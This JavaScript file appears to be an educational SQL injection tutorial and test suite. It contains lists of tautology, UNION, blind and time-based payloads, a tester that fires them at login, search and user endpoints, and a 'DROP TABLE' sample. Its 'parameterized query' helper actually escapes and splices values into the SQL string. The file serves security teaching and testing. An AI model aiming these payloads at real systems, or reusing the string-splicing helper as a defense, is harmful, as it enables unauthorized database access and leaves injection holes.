/**
 * EDUCATIONAL HACKING TUTORIALS
 * Module 1: Web Application Security
 * Tutorial 1: SQL Injection Testing
 * 
 * ⚠️ EDUCATIONAL PURPOSE ONLY
 * This tutorial is for educational and defensive security purposes only.
 * Only test systems you own or have explicit written permission to test.
 * 
 * Learning Objectives:
 * - Understand SQL injection vulnerabilities
 * - Learn to test for SQL injection safely
 * - Implement defensive measures
 * - Understand different types of SQL injection
 */

import { expect } from "chai";
import supertest from "supertest";

console.log("=== SQL INJECTION TESTING (EDUCATIONAL) ===");

/**
 * SQL Injection Test Suite
 * Tests for common SQL injection vulnerabilities
 */
class SQLInjectionTester {
  constructor(apiClient) {
    this.apiClient = apiClient;
    this.testPayloads = this.generateTestPayloads();
  }

  /**
   * Generate SQL injection test payloads
   */
  generateTestPayloads() {
    return {
      // Basic SQL injection
      basic: [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*"
      ],

      // Union-based SQL injection
      union: [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT user(),database()--"
      ],

      // Boolean-based blind SQL injection
      boolean: [
        "' OR 1=1 AND '1'='1",
        "' OR 1=1 AND '1'='2",
        "' AND 1=1--",
        "' AND 1=2--"
      ],

      // Time-based blind SQL injection
      timeBased: [
        "'; WAITFOR DELAY '00:00:05'--",
        "'; SELECT SLEEP(5)--",
        "' OR SLEEP(5)--"
      ],

      // Error-based SQL injection
      errorBased: [
        "' AND 1=CAST((SELECT version()) AS INT)--",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--"
      ]
    };
  }

  /**
   * Test login endpoint for SQL injection
   */
  async testLoginInjection(username, password) {
    const results = [];

    for (const payload of this.testPayloads.basic) {
      try {
        const response = await this.apiClient
          .post("/login")
          .send({
            username: username + payload,
            password: password
          });

        results.push({
          payload,
          status: response.status,
          vulnerable: this.analyzeResponse(response, payload)
        });
      } catch (error) {
        results.push({
          payload,
          error: error.message,
          vulnerable: false
        });
      }
    }

    return results;
  }

  /**
   * Test search endpoint for SQL injection
   */
  async testSearchInjection(searchTerm) {
    const results = [];

    for (const payload of this.testPayloads.basic) {
      try {
        const response = await this.apiClient
          .get("/search")
          .query({ q: searchTerm + payload });

        results.push({
          payload,
          status: response.status,
          vulnerable: this.analyzeResponse(response, payload)
        });
    } catch (error) {
        results.push({
          payload,
          error: error.message,
          vulnerable: false
        });
      }
    }

    return results;
  }

  /**
   * Test for union-based SQL injection
   */
  async testUnionInjection(endpoint, paramName, paramValue) {
    const results = [];

    for (const payload of this.testPayloads.union) {
      try {
        const response = await this.apiClient
          .get(endpoint)
          .query({ [paramName]: paramValue + payload });

        results.push({
          payload,
          status: response.status,
          vulnerable: this.analyzeUnionResponse(response)
        });
      } catch (error) {
        results.push({
          payload,
          error: error.message,
          vulnerable: false
        });
      }
    }

    return results;
  }

  /**
   * Test for time-based blind SQL injection
   */
  async testTimeBasedInjection(endpoint, paramName, paramValue) {
    const results = [];

    for (const payload of this.testPayloads.timeBased) {
      try {
        const startTime = Date.now();
        const response = await this.apiClient
          .get(endpoint)
          .query({ [paramName]: paramValue + payload });
        const endTime = Date.now();

        const responseTime = endTime - startTime;
        const vulnerable = responseTime > 5000; // If response takes > 5 seconds

        results.push({
          payload,
          responseTime,
          vulnerable
        });
      } catch (error) {
        results.push({
          payload,
          error: error.message,
          vulnerable: false
        });
      }
    }

    return results;
  }

  /**
   * Analyze response for SQL injection indicators
   */
  analyzeResponse(response, payload) {
    const responseText = JSON.stringify(response.body).toLowerCase();
    const errorIndicators = [
      'sql syntax',
      'mysql',
      'postgresql',
      'oracle',
      'sqlite',
      'sql server',
      'database error',
      'sql error',
      'query failed'
    ];

    // Check for SQL error messages
    for (const indicator of errorIndicators) {
      if (responseText.includes(indicator)) {
        return true;
      }
    }

    // Check for unexpected data (union injection)
    if (payload.includes('UNION') && response.body.length > 0) {
      return true;
    }

    return false;
  }

  /**
   * Analyze union-based injection response
   */
  analyzeUnionResponse(response) {
    // Union injection typically returns additional data
    if (Array.isArray(response.body) && response.body.length > 0) {
      // Check if response contains unexpected data
      return true;
    }

    return false;
  }

  /**
   * Generate security report
   */
  generateReport(testResults) {
    const report = {
      totalTests: testResults.length,
      vulnerabilities: testResults.filter(r => r.vulnerable).length,
      safe: testResults.filter(r => !r.vulnerable).length,
      details: testResults
    };

    return report;
  }
}

/**
 * SQL Injection Prevention Helper
 * Demonstrates defensive measures
 */
class SQLInjectionPrevention {
  /**
   * Sanitize input using parameterized queries
   */
  static sanitizeInput(input) {
    // Remove SQL special characters
    return input
      .replace(/'/g, "''") // Escape single quotes
      .replace(/;/g, '') // Remove semicolons
      .replace(/--/g, '') // Remove comment markers
      .replace(/\/\*/g, '') // Remove block comments
      .replace(/\*\//g, '')
      .trim();
  }

  /**
   * Validate input format
   */
  static validateInput(input, type = 'string') {
    switch (type) {
      case 'email':
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input);
      case 'number':
        return /^\d+$/.test(input);
      case 'alphanumeric':
        return /^[a-zA-Z0-9]+$/.test(input);
      default:
        return typeof input === 'string' && input.length > 0;
    }
  }

  /**
   * Use parameterized queries (example pattern)
   */
  static buildParameterizedQuery(query, params) {
    // This is a conceptual example
    // In real implementation, use database-specific parameterized query libraries
    let safeQuery = query;
    params.forEach((param, index) => {
      const sanitized = this.sanitizeInput(String(param));
      safeQuery = safeQuery.replace(`$${index + 1}`, `'${sanitized}'`);
    });
    return safeQuery;
  }

  /**
   * Whitelist validation
   */
  static whitelistInput(input, allowedValues) {
    return allowedValues.includes(input);
  }
}

// Exercises and Tests
describe("SQL Injection Testing (Educational)", () => {
  const baseURL = "https://api.example.com"; // Replace with your test API
  const request = supertest(baseURL);
  let sqlTester;

  beforeEach(() => {
    sqlTester = new SQLInjectionTester(request);
  });

  it("should generate SQL injection test payloads", () => {
    const payloads = sqlTester.generateTestPayloads();

    expect(payloads).to.have.property('basic');
    expect(payloads).to.have.property('union');
    expect(payloads).to.have.property('boolean');
    expect(payloads).to.have.property('timeBased');

    expect(payloads.basic.length).to.be.greaterThan(0);
    expect(payloads.union.length).to.be.greaterThan(0);
  });

  it("should test login endpoint for SQL injection", async () => {
    // ⚠️ Only test on systems you own or have permission to test
    try {
      const results = await sqlTester.testLoginInjection("admin", "password");

      expect(results).to.be.an('array');
      results.forEach(result => {
        expect(result).to.have.property('payload');
        expect(result).to.have.property('vulnerable');
      });

      const report = sqlTester.generateReport(results);
      console.log("SQL Injection Test Report:", report);
    } catch (error) {
      // Network errors are acceptable in demo
      expect(error).to.be.an('error');
    }
  });

  it("should test search endpoint for SQL injection", async () => {
    try {
      const results = await sqlTester.testSearchInjection("test");

      expect(results).to.be.an('array');
      results.forEach(result => {
        expect(result).to.have.property('payload');
      });
    } catch (error) {
      expect(error).to.be.an('error');
    }
  });

  it("should test for union-based SQL injection", async () => {
    try {
      const results = await sqlTester.testUnionInjection("/users", "id", "1");

      expect(results).to.be.an('array');
      results.forEach(result => {
        expect(result).to.have.property('payload');
        expect(result).to.have.property('vulnerable');
      });
    } catch (error) {
      expect(error).to.be.an('error');
    }
  });

  it("should test for time-based blind SQL injection", async () => {
    try {
      const results = await sqlTester.testTimeBasedInjection("/users", "id", "1");

      expect(results).to.be.an('array');
      results.forEach(result => {
        expect(result).to.have.property('payload');
        expect(result).to.have.property('responseTime');
      });
    } catch (error) {
      expect(error).to.be.an('error');
    }
  });
});

// Defensive Measures Tests
describe("SQL Injection Prevention", () => {
  it("should sanitize SQL injection attempts", () => {
    const maliciousInput = "admin' OR '1'='1";
    const sanitized = SQLInjectionPrevention.sanitizeInput(maliciousInput);

    expect(sanitized).to.not.include("' OR '1'='1");
    expect(sanitized).to.not.include("--");
  });

  it("should validate input format", () => {
    expect(SQLInjectionPrevention.validateInput("user@example.com", "email")).to.be.true;
    expect(SQLInjectionPrevention.validateInput("invalid-email", "email")).to.be.false;
    expect(SQLInjectionPrevention.validateInput("12345", "number")).to.be.true;
    expect(SQLInjectionPrevention.validateInput("abc123", "alphanumeric")).to.be.true;
  });

  it("should use whitelist validation", () => {
    const allowedValues = ["admin", "user", "guest"];
    expect(SQLInjectionPrevention.whitelistInput("admin", allowedValues)).to.be.true;
    expect(SQLInjectionPrevention.whitelistInput("hacker", allowedValues)).to.be.false;
  });

  it("should build parameterized queries", () => {
    const query = "SELECT * FROM users WHERE username = $1 AND password = $2";
    const params = ["admin", "password123"];

    const safeQuery = SQLInjectionPrevention.buildParameterizedQuery(query, params);

    expect(safeQuery).to.include("admin");
    expect(safeQuery).to.include("password123");
    expect(safeQuery).to.not.include("' OR '1'='1");
  });
});

// Security Best Practices
describe("SQL Injection Security Best Practices", () => {
  it("should demonstrate input validation", () => {
    const testCases = [
      { input: "admin' OR '1'='1", shouldBeValid: false },
      { input: "admin", shouldBeValid: true },
      { input: "'; DROP TABLE users; --", shouldBeValid: false },
      { input: "normal_user", shouldBeValid: true }
    ];

    testCases.forEach(testCase => {
      const isValid = SQLInjectionPrevention.validateInput(testCase.input, 'alphanumeric');
      expect(isValid).to.equal(testCase.shouldBeValid);
    });
  });

  it("should demonstrate defense in depth", () => {
    const maliciousInput = "admin' OR '1'='1";

    // Layer 1: Input validation
    const isValid = SQLInjectionPrevention.validateInput(maliciousInput, 'alphanumeric');
    expect(isValid).to.be.false;

    // Layer 2: Sanitization
    const sanitized = SQLInjectionPrevention.sanitizeInput(maliciousInput);
    expect(sanitized).to.not.equal(maliciousInput);

    // Layer 3: Whitelist (if applicable)
    const allowedValues = ["admin", "user"];
    const isWhitelisted = SQLInjectionPrevention.whitelistInput("admin", allowedValues);
    expect(isWhitelisted).to.be.true;
  });
});

export {
  SQLInjectionTester,
  SQLInjectionPrevention
};

